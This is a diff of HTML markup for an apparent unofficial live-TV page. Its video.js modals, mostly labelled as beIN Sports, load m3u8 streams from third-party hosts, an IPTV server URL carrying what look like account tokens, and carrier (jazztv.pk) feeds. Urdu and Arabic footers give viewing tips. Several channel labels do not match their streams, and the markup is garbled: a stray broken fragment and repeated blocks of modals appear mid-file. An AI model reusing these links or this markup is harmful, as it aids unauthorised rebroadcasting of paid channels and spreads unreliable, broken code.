+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#8 -->
+        <div style="width: 100%;" class="modal fade" id="myModal8" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 3 SD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits8" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video8" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/34d0ecb91942ec6.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/geoent-122/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video8').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#9 -->
+        <div style="width: 100%;" class="modal fade" id="myModal9" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 4K S</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits9" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video9" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://driptvs.com:8080/live/vuz4hoR9da/RtaWyxMzDj/74136.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="http://driptvs.com:8080/live/vuz4hoR9da/RtaWyxMzDj/74136.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video9').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#10 -->
+        <div style="width: 100%;" class="modal fade" id="myModal10" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 4K  </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits10" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video10" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://185.238.0.145:1313/c/livedo/bein1hd.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/Samaa-157-3/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video10').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#11 -->
+        <div style="width: 100%;" class="modal fade" id="myModal11" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">Gurm77</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits11" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video11" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/HumSitaray-157-4/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/HumSitaray-157-4/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video11').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+        <!-- ModalNO#12 -->
+        <div style="width: 100%;" class="modal fade" id="myModal12" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">Gurmani090</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits12" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video12" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/bolnews-159-3/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/bolnews-159-3/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video12').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+        <!-- ModalNO#13 -->
+        <div style="width: 100%;" class="modal fade" id="myModal13" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">GurmaniTmlm</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits13" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video13" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/DunyaNews-113/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/DunyaNews-113/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video13').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+        <!-- ModalNO#14 -->
+        <div style="width: 100%;" class="modal fade" id="myModal14" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS HD </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits14" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video14" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/ptv-home-174/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/ptv-home-174/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video14').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+
+
+
+    </div>
+
+
+    <!-- ModalNO#15 -->
+    <div style="width: 100%;" class="modal fade" id="myModal15" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+
+            <div class="modal-content">
+
+                <div class="modal-header">
+                    <h4 class="Arain">BEIN SPORTS 6 HD </h4>
+
+                </div>
+
+                <i class="fa fa-eye" aria-hidden="true"></i>
+                <h6 id="count" style="text-align: center; margin-top: 30px;color:black;"> 
+                    <span> </span>
+                </h6>
+                <h6 style="text-align: center;margin-left: 80px; margin-top: -23px;color:black;">Viewers </h6>
+                <div class="modal-body">
+
+
+
+                    <video id="my-video15" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                        width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                        <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/fa0ce095e9977d8.m3u8"
+                            type='application/x-mpegURL'>
+                        <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/fa0ce095e9977d8.m3u8"
+                            type='application/x-mpegURL'>
+                        <p class="vjs-no-js">
+                            To view this video please enable JavaScript, and consider upgrading to a
+                            web browser
+                            that
+                            <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                supports HTML5
+                                video </a>
+
+                        </p>
+                    </video>
+
+
+
+
+
+
+                </div>
+
+
+                <div class="modal-footer">
+                    <button type="button" class="button2" data-dismiss="modal"
+                        onclick="videojs('my-video15').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                </div>
+
+
+
+            </div>
+
+
+
+
+        </div>
+
+    </div>
+
+
+
+
+
+
+
+    <!-- ModalNO#16 -->
+    <div style="width: 100%;" class="modal fade" id="myModal16" role="dialog">
+        <div class="modal-dialog">
+
+            <!-- Modal content-->
+
+            <div class="modal-content">
+
+                <div class="modal-header">
+                    <h4 class="Arain">Gurmani</h4>
+
+                </div>
+
+                <i class="fa fa-eye" aria-hidden="true"></i>
+                <h6 id="visits16" style="text-align: center; margin-top: 30px;color:black;"> 
+                    <span> </span>
+                </h6>
+                <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                <div class="modal-body">
+
+
+
+                    <video id="my-video16" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                        width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                        <source src="https://cdn2.jazztv.pk:8087/jazzauth/Urdu1-158-4/playlist.m3u8"
+                            type='application/x-mpegURL'>
+                        <source src="https://cdn2.jazztv.pk:8087/jazzauth/Urdu1-158-4/playlist.m3u8"
+                            type='application/x-mpegURL'>
+                        <p class="vjs-no-js">
+                            To view this video please enable JavaScript, and consider upgrading to a
+                            web browser
+                            that
+                            <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                supports HTML5
+                                video </a>
+
+                        </p>
+"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video5').pause()">Back</button>
+
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+
+ادا ضهر خطأ في قناة قم بسحب من أعلى إلى أسفل لتحديت صفحة 
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#6 -->
+        <div style="width: 100%;" class="modal fade" id="myModal6" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 SD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits6" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video6" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/231bf167aecdf2b.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/geonews-137/playlist.m3u8?"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video6').pause()">Back</button>
+
+تنوية: قم بضغط على مربع تكبير صورة اذا لم تجد قناة شغاله قم بخروج من تطبيق وإعادة دخول ستجده شغاله 
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#7 -->
+        <div style="width: 100%;" class="modal fade" id="myModal7" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 2 SD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits7" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video7" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/43c2c7b22439581.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/Hum-TV-136-3/playlist.m3u8?"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video7').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+        <!-- ModalNO#8 -->
+        <div style="width: 100%;" class="modal fade" id="myModal8" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 3 SD</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits8" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video8" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://4ce5e2d62ee2c10e43c709f9b87c44d5.streamhost.cc/m3u8/Sports/34d0ecb91942ec6.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/geoent-122/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video8').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#9 -->
+        <div style="width: 100%;" class="modal fade" id="myModal9" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 4K S</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits9" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video9" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://driptvs.com:8080/live/vuz4hoR9da/RtaWyxMzDj/74136.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="http://driptvs.com:8080/live/vuz4hoR9da/RtaWyxMzDj/74136.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video9').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#10 -->
+        <div style="width: 100%;" class="modal fade" id="myModal10" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">BEIN SPORTS 1 4K  </h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits10" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video10" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="http://185.238.0.145:1313/c/livedo/bein1hd.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/Samaa-157-3/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video10').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+        <!-- ModalNO#11 -->
+        <div style="width: 100%;" class="modal fade" id="myModal11" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">Gurm77</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits11" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video11" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/HumSitaray-157-4/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/HumSitaray-157-4/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video11').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+        <!-- ModalNO#12 -->
+        <div style="width: 100%;" class="modal fade" id="myModal12" role="dialog">
+            <div class="modal-dialog">
+
+                <!-- Modal content-->
+
+                <div class="modal-content">
+
+                    <div class="modal-header">
+                        <h4 class="Arain">Gurmani090</h4>
+
+                    </div>
+
+                    <i class="fa fa-eye" aria-hidden="true"></i>
+                    <h6 id="visits12" style="text-align: center; margin-top: 30px;color:black;"> 
+                        <span> </span>
+                    </h6>
+                    <h6 style="text-align: center;margin-left: 70px; margin-top: -23px;color:black;">Viewers </h6>
+                    <div class="modal-body">
+
+
+
+                        <video id="my-video12" class="video-js vjs-default-skin vjs-fluid" controls preload="none"
+                            width="16" height="9" poster="https://up4net.com/uploads4/up4net.com164216223958571.png" data-setup="{}">
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/bolnews-159-3/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <source src="https://cdn2.jazztv.pk:8087/jazzauth/bolnews-159-3/playlist.m3u8"
+                                type='application/x-mpegURL'>
+                            <p class="vjs-no-js">
+                                To view this video please enable JavaScript, and consider upgrading to a
+                                web browser
+                                that
+                                <li data-url=="http://videojs.com/html5-video-support/" target="_blank">
+                                    supports HTML5
+                                    video </a>
+
+                            </p>
+                        </video>
+
+
+
+
+
+
+                    </div>
+
+
+                    <div class="modal-footer">
+                        <button type="button" class="button2" data-dismiss="modal"
+                            onclick="videojs('my-video12').pause()">Back</button>
+
+نوٹ :  فل سکرین کے لیے پہلے موبائل کا آٹوروٹیٹ آن کریں۔ پھر موبائل کو گھمائیں اور فول بٹن پر کلک کریں۔ یہ چینل جاز کی سم سے فری ہے۔ آپ اس کو زیرو ایم بی پر بھی چلا سکتے ہیں
+
+                    </div>
+
+
+
+                </div>
+
+
+
+
+            </div>
+
+        </div>
+
+
+
+        <!-- ModalNO#13 -->
+        <div style="width: 100%;" class="modal fade" id="myModal13" role="dialog">
+            <div class="modal-dialog">
+
